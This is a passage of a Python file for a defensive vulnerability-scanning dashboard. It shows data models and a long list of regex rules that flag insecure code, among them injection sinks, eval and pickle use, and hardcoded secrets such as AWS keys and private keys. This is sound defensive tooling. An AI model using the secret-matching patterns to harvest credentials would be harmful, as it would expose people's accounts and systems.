"""
================================================================================
 SENTINEL AI — Advanced Threat & Vulnerability Intelligence Platform
================================================================================
A defensive security dashboard that combines:
  1. Static source-code vulnerability scanning (pattern/CWE based)
  2. Software dependency CVE lookup (mock local database, extensible)
  3. Network telemetry ingestion + anomaly scoring
  4. Threat-intelligence IP reputation scoring
  5. LLM-powered deep triage (OpenAI / Anthropic / local Ollama)
  6. Active containment playbooks (simulated SOC actions)
  7. Exportable incident + vulnerability reports
  8. Dark "SOC command center" UI built with Streamlit

NOTE: This tool performs *defensive* analysis only — it detects and explains
risky patterns in code/logs you already own, it does not generate exploits,
attack payloads, or perform unauthorized scanning of third-party systems.
================================================================================
"""

import ast
import concurrent.futures
import hashlib
import io
import json
import random
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, FrozenSet, List, Optional, Set, Tuple

import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import requests
import streamlit as st
from pydantic import BaseModel, Field

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None

try:
    from anthropic import Anthropic
except ImportError:
    Anthropic = None


# ==============================================================================
# SECTION 1: DATA MODELS
# ==============================================================================

class VulnerabilityFinding(BaseModel):
    finding_id: str
    rule_id: str
    title: str
    severity: str  # Critical / High / Medium / Low / Info
    cwe: str
    cvss_estimate: float = Field(ge=0.0, le=10.0)
    file_name: str
    line_number: int
    matched_snippet: str
    description: str
    remediation: str
    confidence: str = "Medium"


class DependencyVuln(BaseModel):
    package: str
    installed_version: str
    vulnerable_range: str
    cve_id: str
    severity: str
    summary: str
    fixed_version: str


class LogEvent(BaseModel):
    event_id: str
    timestamp: float
    source_ip: str
    target_asset: str
    protocol: str
    raw_payload: str
    anomaly_score: float = Field(default=0.0, ge=0.0, le=100.0)
    threat_category: str = "Unclassified"
    status: str = "Active"


class ThreatIntelResult(BaseModel):
    ip_address: str
    reputation_score: int  # 0 (clean) - 100 (malicious)
    classification: str
    is_private: bool
    notes: List[str]


class TriageReport(BaseModel):
    threat_level: str
    attack_vector: str
    impact_assessment: str
    actionable_remediation: List[str]


# ==============================================================================
# SECTION 2: STATIC CODE VULNERABILITY RULE ENGINE
# ==============================================================================
# Each rule is a lightweight, explainable heuristic — not a full AST/data-flow
# analyzer — intended to flag risky patterns for human review, in the same
# spirit as tools like Bandit / Semgrep community rules.

VULNERABILITY_RULES: List[Dict[str, Any]] = [
    {
        "id": "SEC-001", "title": "Possible SQL Injection via string concatenation",
        "pattern": r"(execute|cursor\.execute)\s*\(\s*[\"'].*%s.*[\"']\s*%",
        "severity": "Critical", "cwe": "CWE-89", "cvss": 9.1,
        "description": "User-controlled input appears to be concatenated directly into a SQL query string.",
        "remediation": "Use parameterized queries or an ORM with bound parameters instead of string formatting."
    },
    {
        "id": "SEC-002", "title": "Possible SQL Injection via f-string query",
        "pattern": r"(execute|query)\s*\(\s*f[\"'].*\{.*\}.*[\"']\s*\)",
        "severity": "Critical", "cwe": "CWE-89", "cvss": 9.1,
        "description": "An f-string is being interpolated directly into a database query call.",
        "remediation": "Never interpolate variables directly into SQL text; use parameter placeholders (?, %s, :name)."
    },
    {
        "id": "SEC-003", "title": "Command Injection via os.system",
        "pattern": r"os\.system\s*\(.*\+.*\)",
        "severity": "Critical", "cwe": "CWE-78", "cvss": 9.8,
        "description": "os.system is invoked with a concatenated / dynamic string, risking shell command injection.",
        "remediation": "Use subprocess.run() with a list of arguments and shell=False; validate/allowlist inputs."
    },
    {
        "id": "SEC-004", "title": "Command Injection via subprocess shell=True",
        "pattern": r"subprocess\.(run|call|Popen)\([^)]*shell\s*=\s*True",
        "severity": "High", "cwe": "CWE-78", "cvss": 8.6,
        "description": "subprocess called with shell=True, which can allow shell metacharacter injection.",
        "remediation": "Avoid shell=True; pass command arguments as a list and validate untrusted input."
    },
    {
        "id": "SEC-005", "title": "Dangerous use of eval()",
        "pattern": r"\beval\s*\(",
        "severity": "Critical", "cwe": "CWE-95", "cvss": 9.3,
        "description": "eval() executes arbitrary code and is dangerous when given untrusted input.",
        "remediation": "Replace eval() with ast.literal_eval() for data, or a safe parser/whitelist for logic."
    },
    {
        "id": "SEC-006", "title": "Dangerous use of exec()",
        "pattern": r"\bexec\s*\(",
        "severity": "Critical", "cwe": "CWE-95", "cvss": 9.3,
        "description": "exec() executes arbitrary Python code and is a common RCE vector.",
        "remediation": "Remove dynamic code execution; use explicit function dispatch tables instead."
    },
    {
        "id": "SEC-007", "title": "Insecure Deserialization via pickle",
        "pattern": r"pickle\.(loads|load)\s*\(",
        "severity": "Critical", "cwe": "CWE-502", "cvss": 9.0,
        "description": "pickle can execute arbitrary code during deserialization of untrusted data.",
        "remediation": "Use a safe serialization format like JSON, or sign/verify pickled payloads before loading."
    },
    {
        "id": "SEC-008", "title": "Insecure YAML load",
        "pattern": r"yaml\.load\s*\((?!.*Loader)",
        "severity": "High", "cwe": "CWE-502", "cvss": 8.1,
        "description": "yaml.load() without a restricted Loader can instantiate arbitrary Python objects.",
        "remediation": "Use yaml.safe_load() instead of yaml.load()."
    },
    {
        "id": "SEC-009", "title": "Hardcoded password",
        "pattern": r"(?i)(password|passwd|pwd)\s*=\s*[\"'][^\"']{4,}[\"']",
        "severity": "High", "cwe": "CWE-798", "cvss": 7.5,
        "description": "A password appears to be hardcoded directly in source code.",
        "remediation": "Move secrets to environment variables or a secrets manager (Vault, AWS Secrets Manager, etc.)."
    },
    {
        "id": "SEC-010", "title": "Hardcoded API key",
        "pattern": r"(?i)(api[_-]?key|apikey)\s*=\s*[\"'][A-Za-z0-9_\-]{16,}[\"']",
        "severity": "High", "cwe": "CWE-798", "cvss": 7.5,
        "description": "An API key literal is embedded directly in the source code.",
        "remediation": "Load API keys from environment variables or a secrets manager, never commit them to source control."
    },
    {
        "id": "SEC-011", "title": "Hardcoded AWS Access Key",
        "pattern": r"AKIA[0-9A-Z]{16}",
        "severity": "Critical", "cwe": "CWE-798", "cvss": 9.5,
        "description": "A string matching the AWS access key ID format was found in code.",
        "remediation": "Revoke the exposed key immediately and migrate to IAM roles or a secrets manager."
    },
    {
        "id": "SEC-012", "title": "Weak Hash Algorithm — MD5",
        "pattern": r"hashlib\.md5\s*\(",
        "severity": "Medium", "cwe": "CWE-327", "cvss": 5.3,
        "description": "MD5 is cryptographically broken and unsuitable for security-sensitive hashing.",
        "remediation": "Use SHA-256/SHA-3 for integrity checks, and bcrypt/scrypt/argon2 for password hashing."
    },
    {
        "id": "SEC-013", "title": "Weak Hash Algorithm — SHA1",
        "pattern": r"hashlib\.sha1\s*\(",
        "severity": "Medium", "cwe": "CWE-327", "cvss": 5.3,
        "description": "SHA-1 has known collision weaknesses and should not be used for security purposes.",
        "remediation": "Use SHA-256 or stronger; use a dedicated password hashing algorithm for credentials."
    },
    {
        "id": "SEC-014", "title": "Weak / Deprecated Cipher (DES / RC4)",
        "pattern": r"(?i)\b(DES|RC4|ARC4)\b",
        "severity": "High", "cwe": "CWE-327", "cvss": 7.4,
        "description": "DES and RC4 are deprecated ciphers with known practical attacks.",
        "remediation": "Use AES-256-GCM or ChaCha20-Poly1305 for symmetric encryption."
    },
    {
        "id": "SEC-015", "title": "Insecure randomness for security-sensitive use",
        "pattern": r"random\.(random|randint|choice)\s*\(.*(token|secret|password|otp)",
        "severity": "High", "cwe": "CWE-330", "cvss": 7.5,
        "description": "The standard random module is not cryptographically secure.",
        "remediation": "Use the secrets module (secrets.token_hex, secrets.choice) for security-sensitive randomness."
    },
    {
        "id": "SEC-016", "title": "Cross-Site Scripting via innerHTML",
        "pattern": r"\.innerHTML\s*=\s*[^\"'`]",
        "severity": "High", "cwe": "CWE-79", "cvss": 7.4,
        "description": "Assigning dynamic content directly to innerHTML can lead to DOM-based XSS.",
        "remediation": "Use textContent for plain text, or sanitize HTML with a library like DOMPurify."
    },
    {
        "id": "SEC-017", "title": "React dangerouslySetInnerHTML usage",
        "pattern": r"dangerouslySetInnerHTML",
        "severity": "Medium", "cwe": "CWE-79", "cvss": 6.1,
        "description": "dangerouslySetInnerHTML bypasses React's built-in XSS protections.",
        "remediation": "Sanitize any HTML passed to this prop with DOMPurify before rendering."
    },
    {
        "id": "SEC-018", "title": "Path Traversal via unsanitized file open",
        "pattern": r"open\s*\(\s*[a-zA-Z_][\w\.]*\s*(\+|,)",
        "severity": "High", "cwe": "CWE-22", "cvss": 7.5,
        "description": "A file path built from a variable/concatenation may allow directory traversal (../../).",
        "remediation": "Resolve and validate paths against an allowlisted base directory before opening files."
    },
    {
        "id": "SEC-019", "title": "XML External Entity (XXE) risk",
        "pattern": r"etree\.parse\s*\((?!.*resolve_entities\s*=\s*False)",
        "severity": "High", "cwe": "CWE-611", "cvss": 8.2,
        "description": "XML parsing without disabling external entity resolution can allow XXE attacks.",
        "remediation": "Disable DTD/external entity processing (resolve_entities=False) or use defusedxml."
    },
    {
        "id": "SEC-020", "title": "Server-Side Request Forgery (SSRF) risk",
        "pattern": r"requests\.(get|post)\s*\(\s*[a-zA-Z_][\w\.]*\s*\)",
        "severity": "Medium", "cwe": "CWE-918", "cvss": 6.5,
        "description": "A request is made to a URL sourced from a variable that may be user-controlled.",
        "remediation": "Validate/allowlist destination hosts and block requests to internal IP ranges."
    },
    {
        "id": "SEC-021", "title": "Open Redirect",
        "pattern": r"redirect\s*\(\s*request\.(args|GET|params)",
        "severity": "Medium", "cwe": "CWE-601", "cvss": 6.1,
        "description": "A redirect target is taken directly from user-controlled request parameters.",
        "remediation": "Validate the redirect target against an allowlist of internal paths/domains."
    },
    {
        "id": "SEC-022", "title": "Wildcard CORS policy",
        "pattern": r"Access-Control-Allow-Origin[\"']?\s*[:=]\s*[\"']\*[\"']",
        "severity": "Medium", "cwe": "CWE-942", "cvss": 5.4,
        "description": "CORS is configured to allow all origins, which can expose APIs to cross-origin abuse.",
        "remediation": "Restrict Access-Control-Allow-Origin to a specific, trusted set of domains."
    },
    {
        "id": "SEC-023", "title": "Debug mode enabled",
        "pattern": r"(?i)(DEBUG|debug)\s*=\s*True",
        "severity": "Medium", "cwe": "CWE-489", "cvss": 5.3,
        "description": "Debug mode is enabled, which can leak stack traces, secrets, and internal paths.",
        "remediation": "Disable debug mode in any production or externally-reachable deployment."
    },
    {
        "id": "SEC-024", "title": "Cookie missing Secure/HttpOnly flags",
        "pattern": r"set_cookie\s*\((?!.*(secure\s*=\s*True.*httponly\s*=\s*True|httponly\s*=\s*True.*secure\s*=\s*True))",
        "severity": "Medium", "cwe": "CWE-1004", "cvss": 5.9,
        "description": "A cookie is set without both Secure and HttpOnly flags, increasing session hijack risk.",
        "remediation": "Set secure=True and httponly=True on all session/auth cookies."
    },
    {
        "id": "SEC-025", "title": "JWT 'none' algorithm accepted",
        "pattern": r"algorithms\s*=\s*\[.*[\"']none[\"'].*\]",
        "severity": "Critical", "cwe": "CWE-347", "cvss": 9.4,
        "description": "The JWT verifier accepts the 'none' algorithm, allowing signature bypass.",
        "remediation": "Explicitly restrict accepted algorithms to a strong signing method like RS256 or HS256."
    },
    {
        "id": "SEC-026", "title": "Potential LDAP Injection",
        "pattern": r"search_s\s*\(\s*[\"'].*%s.*[\"']\s*%",
        "severity": "High", "cwe": "CWE-90", "cvss": 8.1,
        "description": "An LDAP query filter is built via string formatting with unsanitized input.",
        "remediation": "Escape special LDAP filter characters or use a parameterized LDAP query library."
    },
    {
        "id": "SEC-027", "title": "Potential NoSQL Injection",
        "pattern": r"\$where\s*:\s*[\"'].*\+",
        "severity": "High", "cwe": "CWE-943", "cvss": 8.0,
        "description": "A MongoDB $where clause is constructed using string concatenation with variables.",
        "remediation": "Avoid $where with dynamic JS; use structured query operators with sanitized values."
    },
    {
        "id": "SEC-028", "title": "Deprecated TLS Protocol",
        "pattern": r"ssl\.PROTOCOL_(TLSv1|SSLv2|SSLv3)\b",
        "severity": "High", "cwe": "CWE-326", "cvss": 7.4,
        "description": "An outdated, insecure TLS/SSL protocol version is explicitly configured.",
        "remediation": "Require TLS 1.2 or higher (prefer TLS 1.3)."
    },
    {
        "id": "SEC-029", "title": "TLS certificate verification disabled",
        "pattern": r"verify\s*=\s*False",
        "severity": "High", "cwe": "CWE-295", "cvss": 7.4,
        "description": "TLS certificate verification is disabled, enabling man-in-the-middle attacks.",
        "remediation": "Remove verify=False; use a valid certificate chain or a pinned trusted CA bundle."
    },
    {
        "id": "SEC-030", "title": "Hardcoded internal IP address",
        "pattern": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b",
        "severity": "Low", "cwe": "CWE-200", "cvss": 3.1,
        "description": "An internal/private IP address is hardcoded, which can leak network topology.",
        "remediation": "Externalize environment-specific addresses to configuration files or environment variables."
    },
    {
        "id": "SEC-031", "title": "Unencrypted Telnet usage",
        "pattern": r"\btelnetlib\b|\btelnet\s+\d",
        "severity": "High", "cwe": "CWE-319", "cvss": 7.4,
        "description": "Telnet transmits credentials and data in cleartext.",
        "remediation": "Replace Telnet with SSH for remote administration."
    },
    {
        "id": "SEC-032", "title": "Unencrypted FTP usage",
        "pattern": r"\bftplib\.FTP\s*\(",
        "severity": "Medium", "cwe": "CWE-319", "cvss": 6.5,
        "description": "Plain FTP transmits credentials and files without encryption.",
        "remediation": "Use FTPS (FTP_TLS) or SFTP instead of plain FTP."
    },
    {
        "id": "SEC-033", "title": "Insecure HTTP endpoint",
        "pattern": r"http://(?!localhost|127\.0\.0\.1)[\w\.\-]+",
        "severity": "Low", "cwe": "CWE-319", "cvss": 4.8,
        "description": "A plaintext HTTP (non-HTTPS) URL is used for what may be a sensitive endpoint.",
        "remediation": "Use HTTPS for all network communication that isn't strictly local/loopback."
    },
    {
        "id": "SEC-034", "title": "Server-Side Template Injection (SSTI)",
        "pattern": r"render_template_string\s*\(\s*[a-zA-Z_][\w\.]*\s*\)",
        "severity": "Critical", "cwe": "CWE-1336", "cvss": 9.0,
        "description": "A template string built from user input is rendered directly, enabling SSTI/RCE.",
        "remediation": "Never render user-supplied strings as templates; use render_template with fixed template files."
    },
    {
        "id": "SEC-035", "title": "Prototype Pollution risk (JS)",
        "pattern": r"Object\.assign\s*\(\s*\{\}\s*,\s*JSON\.parse",
        "severity": "Medium", "cwe": "CWE-1321", "cvss": 6.5,
        "description": "Merging untrusted parsed JSON directly can pollute an object's prototype chain.",
        "remediation": "Use a safe deep-merge utility that blocks __proto__/constructor keys."
    },
    {
        "id": "SEC-036", "title": "Unsafe C string copy (strcpy)",
        "pattern": r"\bstrcpy\s*\(",
        "severity": "Critical", "cwe": "CWE-120", "cvss": 9.1,
        "description": "strcpy() does not bound-check and is a classic buffer overflow source.",
        "remediation": "Use strncpy/strlcpy with an explicit, correct size bound, or a safer string type."
    },
    {
        "id": "SEC-037", "title": "Unsafe C input function (gets)",
        "pattern": r"\bgets\s*\(",
        "severity": "Critical", "cwe": "CWE-242", "cvss": 9.8,
        "description": "gets() has no bounds checking and is inherently unsafe; removed from the C11 standard.",
        "remediation": "Use fgets() with an explicit buffer size instead."
    },
    {
        "id": "SEC-038", "title": "Format string vulnerability",
        "pattern": r"printf\s*\(\s*[a-zA-Z_][\w]*\s*\)",
        "severity": "High", "cwe": "CWE-134", "cvss": 8.1,
        "description": "A variable is passed directly as the format string, allowing format string attacks.",
        "remediation": "Always use a constant format string, e.g. printf(\"%s\", user_input)."
    },
    {
        "id": "SEC-039", "title": "Time-of-check to time-of-use (TOCTOU) race condition",
        "pattern": r"os\.path\.exists\s*\([^)]*\)\s*[\r\n]+\s*(open|os\.remove|os\.rename)",
        "severity": "Medium", "cwe": "CWE-367", "cvss": 5.9,
        "description": "A file existence check followed by a separate operation can race with concurrent access.",
        "remediation": "Use atomic file operations (os.open with O_EXCL) instead of check-then-act patterns."
    },
    {
        "id": "SEC-040", "title": "Silently swallowed exception",
        "pattern": r"except[^:]*:\s*\n\s*pass\b",
        "severity": "Low", "cwe": "CWE-390", "cvss": 3.7,
        "description": "Exceptions are caught and silently discarded, which can hide security-relevant failures.",
        "remediation": "Log the exception with context, and only suppress it when the failure mode is well understood."
    },
    {
        "id": "SEC-041", "title": "Weak password length policy",
        "pattern": r"(?i)min_length\s*=\s*[0-7]\b",
        "severity": "Medium", "cwe": "CWE-521", "cvss": 5.3,
        "description": "A minimum password length below 8 characters is configured.",
        "remediation": "Require at least 12 characters and check against breached-password lists (e.g. HaveIBeenPwned range API)."
    },
    {
        "id": "SEC-042", "title": "Directory listing enabled",
        "pattern": r"(?i)autoindex\s+on;",
        "severity": "Medium", "cwe": "CWE-548", "cvss": 5.3,
        "description": "Web server directory listing is enabled, potentially exposing file structure and sensitive files.",
        "remediation": "Disable autoindex in production server configuration."
    },
    {
        "id": "SEC-043", "title": "Java insecure deserialization (ObjectInputStream)",
        "pattern": r"new\s+ObjectInputStream\s*\(",
        "severity": "Critical", "cwe": "CWE-502", "cvss": 9.0,
        "description": "Native Java deserialization of untrusted data is a well-known RCE vector.",
        "remediation": "Use a safe format (JSON/Protobuf) or a validating deserialization filter (JEP 290)."
    },
    {
        "id": "SEC-044", "title": "Java XXE via DocumentBuilderFactory",
        "pattern": r"DocumentBuilderFactory\.newInstance\s*\(\s*\)(?!.*setFeature)",
        "severity": "High", "cwe": "CWE-611", "cvss": 8.2,
        "description": "DocumentBuilderFactory is created without disabling external entity/DOCTYPE processing.",
        "remediation": "Call setFeature to disallow-doctype-decl and disable external entities before parsing."
    },
    {
        "id": "SEC-045", "title": "Insecure randomness for token (Java)",
        "pattern": r"new\s+Random\s*\(\s*\).*(token|session|secret)",
        "severity": "High", "cwe": "CWE-330", "cvss": 7.5,
        "description": "java.util.Random is not cryptographically secure and unsuitable for tokens/session IDs.",
        "remediation": "Use java.security.SecureRandom for any security-sensitive value generation."
    },
    {
        "id": "SEC-046", "title": "Missing clickjacking protection",
        "pattern": r"(?i)X-Frame-Options",
        "severity": "Info", "cwe": "CWE-1021", "cvss": 4.3,
        "description": "X-Frame-Options / frame-ancestors header referenced — verify it's actually enforced app-wide.",
        "remediation": "Set X-Frame-Options: DENY or a strict Content-Security-Policy frame-ancestors directive."
    },
    {
        "id": "SEC-047", "title": "Form submission without CSRF token",
        "pattern": r"<form[^>]*method\s*=\s*[\"']post[\"'](?![^>]*csrf)",
        "severity": "Medium", "cwe": "CWE-352", "cvss": 6.5,
        "description": "A POST form does not appear to include a CSRF token field.",
        "remediation": "Add a per-session CSRF token to all state-changing forms and validate it server-side."
    },
    {
        "id": "SEC-048", "title": "Unrestricted file upload",
        "pattern": r"(?i)\.save\s*\(\s*.*filename.*\)(?!.*allowed)",
        "severity": "High", "cwe": "CWE-434", "cvss": 8.1,
        "description": "An uploaded file is saved using its original filename without extension/type validation.",
        "remediation": "Validate file extension/MIME type, generate a random filename, and store outside the webroot."
    },
    {
        "id": "SEC-049", "title": "Hardcoded private key material",
        "pattern": r"-----BEGIN (RSA |EC |)PRIVATE KEY-----",
        "severity": "Critical", "cwe": "CWE-798", "cvss": 9.8,
        "description": "A private key is embedded directly in source code or configuration.",
        "remediation": "Remove the key from source control, rotate it immediately, and load keys from a secrets manager."
    },
    {
        "id": "SEC-050", "title": "Insecure use of eval() in JavaScript",
        "pattern": r"\beval\s*\(\s*[a-zA-Z_]",
        "severity": "High", "cwe": "CWE-95", "cvss": 8.1,
        "description": "JavaScript eval() with a dynamic argument can execute attacker-controlled code.",
        "remediation": "Avoid eval(); use JSON.parse for data and explicit function references for logic."
    },
    {
        "id": "SEC-051", "title": "Insecure PHP dynamic include (LFI/RFI)",
        "pattern": r"include\s*\(\s*\$_(GET|POST|REQUEST)",
        "severity": "Critical", "cwe": "CWE-98", "cvss": 9.4,
        "description": "A file is included based directly on user-controlled request data (Local/Remote File Inclusion).",
        "remediation": "Never pass request data to include()/require(); use a strict allowlist of known filenames."
    },
    {
        "id": "SEC-052", "title": "PHP unsanitized SQL query",
        "pattern": r"mysqli_query\s*\(\s*\$\w+\s*,\s*[\"'].*\$_(GET|POST)",
        "severity": "Critical", "cwe": "CWE-89", "cvss": 9.1,
        "description": "A raw superglobal is concatenated directly into a mysqli_query call.",
        "remediation": "Use prepared statements (mysqli_prepare / PDO) with bound parameters."
    },
    {
        "id": "SEC-053", "title": "Insecure unserialize() in PHP",
        "pattern": r"\bunserialize\s*\(\s*\$_(GET|POST|COOKIE|REQUEST)",
        "severity": "Critical", "cwe": "CWE-502", "cvss": 9.0,
        "description": "PHP unserialize() on user input can lead to object injection and RCE.",
        "remediation": "Use json_decode() for untrusted data instead of unserialize()."
    },
    {
        "id": "SEC-054", "title": "Missing size bound on file read",
        "pattern": r"\.read\s*\(\s*\)\s*$",
        "severity": "Info", "cwe": "CWE-400", "cvss": 3.1,
        "description": "An unbounded read() call could allow memory exhaustion on very large untrusted input.",
        "remediation": "Read with an explicit size limit or stream large inputs in fixed-size chunks."
    },
    {
        "id": "SEC-055", "title": "Insecure default Flask secret key",
        "pattern": r"app\.secret_key\s*=\s*[\"'](dev|secret|changeme|test)[\"']",
        "severity": "Critical", "cwe": "CWE-798", "cvss": 8.6,
        "description": "A well-known placeholder value is used as the Flask session signing key.",
        "remediation": "Generate a strong random secret key and load it from an environment variable."
    },
    {
        "id": "SEC-056", "title": "SQL query built with .format()",
        "pattern": r"(execute|cursor\.execute)\s*\(\s*[\"'].*\{\}.*[\"']\.format\(",
        "severity": "Critical", "cwe": "CWE-89", "cvss": 9.1,
        "description": "A SQL statement is assembled with str.format(), which does not escape input.",
        "remediation": "Use parameterized queries with placeholders bound by the DB driver."
    },
    {
        "id": "SEC-057", "title": "Overly permissive file permissions",
        "pattern": r"os\.chmod\s*\([^)]*0o?7{2,3}\)",
        "severity": "Medium", "cwe": "CWE-732", "cvss": 6.0,
        "description": "A file or directory is set to world-writable/executable permissions (777/0o777).",
        "remediation": "Grant the minimum permissions needed (e.g. 0o640 for config/secret files)."
    },
    {
        "id": "SEC-058", "title": "Insecure temp file creation",
        "pattern": r"tempfile\.mktemp\s*\(",
        "severity": "Medium", "cwe": "CWE-377", "cvss": 5.9,
        "description": "mktemp() is vulnerable to race conditions where an attacker predicts/pre-creates the path.",
        "remediation": "Use tempfile.mkstemp() or NamedTemporaryFile(), which create the file atomically."
    },
    {
        "id": "SEC-059", "title": "Missing HSTS header configuration",
        "pattern": r"(?i)Strict-Transport-Security",
        "severity": "Info", "cwe": "CWE-319", "cvss": 3.7,
        "description": "HSTS header referenced — verify it is set with an adequate max-age on all HTTPS responses.",
        "remediation": "Set Strict-Transport-Security: max-age=31536000; includeSubDomains on every HTTPS response."
    },
    {
        "id": "SEC-060", "title": "GraphQL introspection enabled in production",
        "pattern": r"(?i)introspection\s*:\s*true",
        "severity": "Medium", "cwe": "CWE-200", "cvss": 5.3,
        "description": "GraphQL introspection is enabled, which can expose the full schema to attackers.",
        "remediation": "Disable introspection in production environments."
    },
    {
        "id": "SEC-061", "title": "Docker container running explicitly as root",
        "pattern": r"(?i)^\s*USER\s+root\s*$",
        "severity": "Medium", "cwe": "CWE-250", "cvss": 5.9,
        "description": "The container explicitly runs as the root user, increasing blast radius on compromise.",
        "remediation": "Create and switch to a dedicated non-root user in the Dockerfile."
    },
    {
        "id": "SEC-062", "title": "Docker ADD used instead of COPY for local files",
        "pattern": r"(?i)^\s*ADD\s+\./",
        "severity": "Low", "cwe": "CWE-829", "cvss": 3.1,
        "description": "ADD has implicit tar-extraction/URL-fetch behavior that COPY does not, increasing risk surface.",
        "remediation": "Use COPY for local files; reserve ADD only for its specific documented use cases."
    },
    {
        "id": "SEC-063", "title": "Kubernetes container with privileged: true",
        "pattern": r"privileged:\s*true",
        "severity": "Critical", "cwe": "CWE-250", "cvss": 8.8,
        "description": "A Kubernetes pod spec grants full privileged access to the host.",
        "remediation": "Remove privileged: true; use fine-grained Linux capabilities instead."
    },
    {
        "id": "SEC-064", "title": "Kubernetes hostNetwork enabled",
        "pattern": r"hostNetwork:\s*true",
        "severity": "High", "cwe": "CWE-668", "cvss": 7.5,
        "description": "hostNetwork: true gives the pod direct access to the node's network namespace.",
        "remediation": "Avoid hostNetwork unless strictly required; use Services/Ingress instead."
    },
    {
        "id": "SEC-065", "title": "Terraform hardcoded cloud credentials",
        "pattern": r"(?i)(access_key|secret_key)\s*=\s*[\"'][A-Za-z0-9/+=]{16,}[\"']",
        "severity": "Critical", "cwe": "CWE-798", "cvss": 9.1,
        "description": "Cloud provider credentials appear hardcoded in Terraform/IaC configuration.",
        "remediation": "Use a credentials provider chain / environment variables / a secrets backend instead."
    },
    {
        "id": "SEC-066", "title": "Terraform S3 bucket public read/write",
        "pattern": r"acl\s*=\s*[\"'](public-read|public-read-write)[\"']",
        "severity": "Critical", "cwe": "CWE-284", "cvss": 8.6,
        "description": "An S3 bucket ACL is configured for public access.",
        "remediation": "Set ACL to private and use bucket policies / signed URLs for controlled access."
    },
    {
        "id": "SEC-067", "title": "Insecure GraphQL query depth (no limit)",
        "pattern": r"(?i)maxDepth\s*:\s*(0|None|null)",
        "severity": "Medium", "cwe": "CWE-770", "cvss": 5.3,
        "description": "GraphQL query depth limiting is disabled, enabling resource-exhaustion (DoS) queries.",
        "remediation": "Set a sane maxDepth/maxComplexity limit on the GraphQL execution engine."
    },
    {
        "id": "SEC-068", "title": "Insecure regular expression (ReDoS risk)",
        "pattern": r"\([^()]*[\+\*]\)[\+\*]",
        "severity": "Medium", "cwe": "CWE-1333", "cvss": 5.9,
        "description": "A nested quantifier pattern was detected that can cause catastrophic backtracking (ReDoS).",
        "remediation": "Simplify the pattern, add input length limits, or use a regex engine with backtracking limits."
    },
    {
        "id": "SEC-069", "title": "Insecure use of pickle for network deserialization",
        "pattern": r"pickle\.loads\s*\(\s*(conn|socket|sock)\.",
        "severity": "Critical", "cwe": "CWE-502", "cvss": 9.5,
        "description": "Data read directly from a network socket is deserialized with pickle.",
        "remediation": "Never deserialize data from an untrusted network peer with pickle; use JSON/Protobuf."
    },
    {
        "id": "SEC-070", "title": "Missing content security policy",
        "pattern": r"(?i)Content-Security-Policy",
        "severity": "Info", "cwe": "CWE-1021", "cvss": 3.1,
        "description": "CSP header referenced — verify a restrictive policy is actually enforced on all pages.",
        "remediation": "Define a strict CSP (default-src 'self') and avoid 'unsafe-inline'/'unsafe-eval'."
    },
    {
        "id": "SEC-071", "title": "Insecure basic auth over HTTP",
        "pattern": r"(?i)Authorization:\s*Basic\s+[A-Za-z0-9+/=]+.{0,40}http://",
        "severity": "High", "cwe": "CWE-522", "cvss": 7.5,
        "description": "HTTP Basic credentials are transmitted over an unencrypted HTTP connection.",
        "remediation": "Only send Basic Authentication credentials over HTTPS, ideally replace with token-based auth."
    },
    {
        "id": "SEC-072", "title": "Insufficient session timeout",
        "pattern": r"(?i)session.*timeout\s*=\s*(0|None|-1|999999)",
        "severity": "Medium", "cwe": "CWE-613", "cvss": 5.3,
        "description": "Session timeout is disabled or set to an effectively infinite value.",
        "remediation": "Configure a reasonable idle/absolute session timeout (e.g. 15-30 minutes for sensitive apps)."
    },
    {
        "id": "SEC-073", "title": "Hardcoded database connection string with credentials",
        "pattern": r"(?i)(mysql|postgres|mongodb)(\+\w+)?://\w+:[^@\s]+@",
        "severity": "Critical", "cwe": "CWE-798", "cvss": 8.6,
        "description": "A database connection string embeds a plaintext username/password.",
        "remediation": "Load connection credentials from environment variables or a secrets manager."
    },
    {
        "id": "SEC-074", "title": "Missing rate limiting on authentication endpoint",
        "pattern": r"(?i)def\s+login\s*\([^)]*\):(?!.*rate_limit)",
        "severity": "Medium", "cwe": "CWE-307", "cvss": 5.3,
        "description": "A login handler does not appear to reference any rate-limiting decorator/logic.",
        "remediation": "Add rate limiting / account lockout / CAPTCHA after repeated failed login attempts."
    },
    {
        "id": "SEC-075", "title": "Insecure use of pickle for cache storage",
        "pattern": r"redis\.set\s*\([^)]*pickle\.dumps",
        "severity": "Medium", "cwe": "CWE-502", "cvss": 6.5,
        "description": "Pickled objects are stored in a shared cache (e.g. Redis) that may be reachable by other services.",
        "remediation": "Prefer JSON serialization for cached values shared across trust boundaries."
    },
    {
        "id": "SEC-076", "title": "Weak JWT secret (short/static)",
        "pattern": r"(?i)jwt\.encode\([^)]*[\"'][a-zA-Z0-9]{1,7}[\"']\s*\)",
        "severity": "High", "cwe": "CWE-326", "cvss": 7.5,
        "description": "A very short signing secret is used to sign JWTs, making brute-force forgery feasible.",
        "remediation": "Use a signing secret of at least 256 bits of entropy, or asymmetric signing (RS256)."
    },
    {
        "id": "SEC-077", "title": "Insecure XML parsing with default XMLParser settings",
        "pattern": r"XMLParser\s*\(\s*\)",
        "severity": "Medium", "cwe": "CWE-611", "cvss": 6.5,
        "description": "An XMLParser is instantiated with default settings, which may allow entity expansion attacks.",
        "remediation": "Instantiate with resolve_entities=False and no_network=True."
    },
    {
        "id": "SEC-078", "title": "Insecure use of shell in Node.js child_process",
        "pattern": r"child_process\.exec\s*\(",
        "severity": "High", "cwe": "CWE-78", "cvss": 8.6,
        "description": "child_process.exec() runs a command through a shell, risking injection via unsanitized input.",
        "remediation": "Use child_process.execFile() or spawn() with an argument array instead of a shell string."
    },
    {
        "id": "SEC-079", "title": "Missing Content-Type sniffing protection",
        "pattern": r"(?i)X-Content-Type-Options",
        "severity": "Info", "cwe": "CWE-430", "cvss": 3.1,
        "description": "X-Content-Type-Options header referenced — confirm it is set to 'nosniff' on all responses.",
        "remediation": "Set X-Content-Type-Options: nosniff on every HTTP response."
    },
    {
        "id": "SEC-080", "title": "Default/well-known admin credentials referenced",
        "pattern": r"(?i)(admin|root)\s*[:=]\s*[\"'](admin|root|password|123456)[\"']",
        "severity": "Critical", "cwe": "CWE-798", "cvss": 9.0,
